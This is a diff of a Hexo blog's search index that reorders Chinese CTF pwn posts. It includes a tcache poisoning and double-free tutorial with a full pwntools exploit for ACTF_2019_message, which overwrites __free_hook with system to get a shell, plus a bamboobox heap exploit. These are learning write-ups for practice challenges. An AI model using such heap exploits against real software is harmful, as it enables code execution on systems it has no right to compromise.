@@ -8,6 +8,24 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Hello World</title>
+    <url>/2023/04/27/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>AWD</title>
     <url>/2023/06/21/awd/</url>
     <content><![CDATA[<p>本篇主要讲的是相对于pwn来说比较基础的awd攻防对抗的几种类型，比如对溢出漏洞，格式化字符串漏洞，整数溢出漏洞，数组索引越界漏洞，以及跟堆有关的UAF漏洞的修复。</p>
@@ -39,24 +57,6 @@
 <p>可以看到该程序的输出已经正常。</p>
 <p>可是呢该程序是没有开启pie保护的，如果开启了pie保护呢，那我们在jmp的时候地址岂不是不确定了，但是我在开启pie式的时候发现按照上面的地址方式（开了pie时成了偏移）照样行得通。</p>
 <p>先写这么多吧。</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2023/04/27/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
   </entry>
   <entry>
@@ -99,6 +99,48 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,<span class="built_in">input</span></span>):</span><br><span class="line">    p.sendlineafter( <span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the name of item:&#x27;</span>,<span class="built_in">input</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter( <span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the index of item:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">ind,index,<span class="built_in">input</span></span>):</span><br><span class="line">    p.sendlineafter( <span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the index of item:&#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please enter the new name of the item:&#x27;</span>,<span class="built_in">input</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter( <span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&quot;aaaa&quot;</span>)<span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(-<span class="number">0x70</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x400D49</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>悄悄插一句，这个方法只能打通本地，因为这个后门是假的，打远端还得用unlink……</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>tcache-poisoning-doublefree</title>
+    <url>/2023/07/07/tcache-poisoning-doublefree/</url>
+    <content><![CDATA[<h1 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h1><p>主要的利用手段是覆盖tcache中的next成员变量，由于tcache_get()函数没有对next进行检查，所以理论上来讲如果我们将next中的地址进行替换，不需要伪造任何chunk结构即可实现malloc到任何地址，简单来说就是将堆的fd指针修改为”__free_hook”，执行我们想要的比如system；</p>
+<h1 id="doublefree"><a href="#doublefree" class="headerlink" title="doublefree"></a>doublefree</h1><p>其实就是同一个指针free两次。虽然一般把它叫做double free。其实只要是free一个指向堆内存的指针都有可能产生可以利用的漏洞；</p>
+<p>接下来我将主要演示一下在做题时doublefree的表示（包含tcache poisoning）：</p>
+<p>以下纯属作者个人的理解</p>
+<p>咱们的目的主要是想让程序执行我们准备的恶意堆块，那应该怎么做呢，很显然就得利用到doublefree了，举个例子</p>
+<p>申请一个0x60（假设为堆块A）的堆块，连续free两次时会出现：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/1.png"></p>
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/2.png"></p>
+<p>可以看到堆块A的fd指针指向了堆块A，可是这有什么用呢，当然有用，这时候我们可以在申请一个同样大小的堆块B，这个堆块我们可以控制，这也就代表我们控制了堆块A的fd指针的指向…..假设我们在堆块B中写入free hook的地址</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/3.png"></p>
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/4.png"></p>
+<p>可以看到这个时候堆块A的fd指针已经指向了堆块B，那么这个时候我们再把堆块A申请出来就可以了，再将freehook指针指向比如system这样就达到了我的目的。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/5.png" alt="add(堆块A)"></p>
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/6.png" alt="add(加入system)"></p>
+<p>可以看到freehook的指针已经指向system,这样就成功调用了system</p>
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/7.png" alt="system的地址"></p>
+<p>接下看来以[ACTF_2019_message]为例</p>
+<h1 id="ACTF-2019-message"><a href="#ACTF-2019-message" class="headerlink" title="ACTF_2019_message"></a>ACTF_2019_message</h1><p>题目源文件</p>
+<p>[链接：<a href="https://pan.baidu.com/s/1anJ1ufkBKnFU9aaa5-qT4A">https://pan.baidu.com/s/1anJ1ufkBKnFU9aaa5-qT4A</a>  </p>
+<p>提取码：chen]:</p>
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/8.png"></p>
+<p>一个菜单题，有输入和输出，经过检查不存在UAF。</p>
+<p>查看保护：</p>
+<p><img src="/2023/07/07/tcache-poisoning-doublefree/9.png"></p>
+<p>没有开PIE，RELRO全部开启。</p>
+<p>题目中没有给libc库（很难受），本人以18.04的ubuntu用tcache poisoning + doublefree的方法解决的（远端估计打不通），使用的libc版本为libs&#x2F;2.27-3ubuntu1_amd64&#x2F;libc-2.27.so</p>
+<p>由于题比较简单，不作一一解释</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./actf&quot;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,25689)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./actf&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#debug(p,0x00000000400A92)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,message</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;message:\n&#x27;</span> , <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;message:\n&#x27;</span> , message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;delete:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,message</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;edit:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;message:\n&#x27;</span> , message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;display:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x800</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#1    #unsortedbin</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x800</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)<span class="comment">#3  #unsortedbin</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bbbbbbbb&quot;</span>)</span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="comment">#print(hex(leak))</span></span><br><span class="line">libc_base=leak-<span class="number">0x3ebca0</span></span><br><span class="line">free = libc_base+<span class="number">0x3ed8e8</span></span><br><span class="line">system = libc_base + <span class="number">0x4f440</span></span><br><span class="line"><span class="comment">#system = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment">#free = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 ]]></content>
   </entry>
   <entry>
@@ -165,48 +207,6 @@
 <p>记住要挂梯子哟！！！</p>
 <hr>
 <p>注：本人是纯小白，肯定有错误的，看了还是不行的去网上查，我也是从网上查一步步做出来的，加油！！！！</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>tcache-poisoning-doublefree</title>
-    <url>/2023/07/07/tcache-poisoning-doublefree/</url>
-    <content><![CDATA[<h1 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h1><p>主要的利用手段是覆盖tcache中的next成员变量，由于tcache_get()函数没有对next进行检查，所以理论上来讲如果我们将next中的地址进行替换，不需要伪造任何chunk结构即可实现malloc到任何地址，简单来说就是将堆的fd指针修改为”__free_hook”，执行我们想要的比如system；</p>
-<h1 id="doublefree"><a href="#doublefree" class="headerlink" title="doublefree"></a>doublefree</h1><p>其实就是同一个指针free两次。虽然一般把它叫做double free。其实只要是free一个指向堆内存的指针都有可能产生可以利用的漏洞；</p>
-<p>接下来我将主要演示一下在做题时doublefree的表示（包含tcache poisoning）：</p>
-<p>以下纯属作者个人的理解</p>
-<p>咱们的目的主要是想让程序执行我们准备的恶意堆块，那应该怎么做呢，很显然就得利用到doublefree了，举个例子</p>
-<p>申请一个0x60（假设为堆块A）的堆块，连续free两次时会出现：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/1.png"></p>
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/2.png"></p>
-<p>可以看到堆块A的fd指针指向了堆块A，可是这有什么用呢，当然有用，这时候我们可以在申请一个同样大小的堆块B，这个堆块我们可以控制，这也就代表我们控制了堆块A的fd指针的指向…..假设我们在堆块B中写入free hook的地址</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/3.png"></p>
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/4.png"></p>
-<p>可以看到这个时候堆块A的fd指针已经指向了堆块B，那么这个时候我们再把堆块A申请出来就可以了，再将freehook指针指向比如system这样就达到了我的目的。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/5.png" alt="add(堆块A)"></p>
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/6.png" alt="add(加入system)"></p>
-<p>可以看到freehook的指针已经指向system,这样就成功调用了system</p>
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/7.png" alt="system的地址"></p>
-<p>接下看来以[ACTF_2019_message]为例</p>
-<h1 id="ACTF-2019-message"><a href="#ACTF-2019-message" class="headerlink" title="ACTF_2019_message"></a>ACTF_2019_message</h1><p>题目源文件</p>
-<p>[链接：<a href="https://pan.baidu.com/s/1anJ1ufkBKnFU9aaa5-qT4A">https://pan.baidu.com/s/1anJ1ufkBKnFU9aaa5-qT4A</a>  </p>
-<p>提取码：chen]:</p>
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/8.png"></p>
-<p>一个菜单题，有输入和输出，经过检查不存在UAF。</p>
-<p>查看保护：</p>
-<p><img src="/2023/07/07/tcache-poisoning-doublefree/9.png"></p>
-<p>没有开PIE，RELRO全部开启。</p>
-<p>题目中没有给libc库（很难受），本人以18.04的ubuntu用tcache poisoning + doublefree的方法解决的（远端估计打不通），使用的libc版本为libs&#x2F;2.27-3ubuntu1_amd64&#x2F;libc-2.27.so</p>
-<p>由于题比较简单，不作一一解释</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./actf&quot;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,25689)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./actf&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#debug(p,0x00000000400A92)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,message</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;message:\n&#x27;</span> , <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;message:\n&#x27;</span> , message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;delete:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,message</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;edit:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;message:\n&#x27;</span> , message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span> , <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;display:\n&#x27;</span> , <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x800</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#1    #unsortedbin</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x800</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)<span class="comment">#3  #unsortedbin</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bbbbbbbb&quot;</span>)</span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="comment">#print(hex(leak))</span></span><br><span class="line">libc_base=leak-<span class="number">0x3ebca0</span></span><br><span class="line">free = libc_base+<span class="number">0x3ed8e8</span></span><br><span class="line">system = libc_base + <span class="number">0x4f440</span></span><br><span class="line"><span class="comment">#system = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment">#free = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 ]]></content>
   </entry>
 </search>
